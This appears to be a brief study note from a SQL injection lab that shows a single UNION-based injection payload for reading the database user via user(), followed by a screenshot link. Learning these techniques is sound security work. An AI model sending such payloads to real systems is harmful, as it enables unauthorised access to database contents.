# [Union Injection](Union%20Injection.md)
### Use a Union injection to get the result of 'user()'

```sql
cn' UNION select 1, user(), 3, 4 -- -
```
![](Screenshot%202026-06-17%20at%2018.46.41.png)
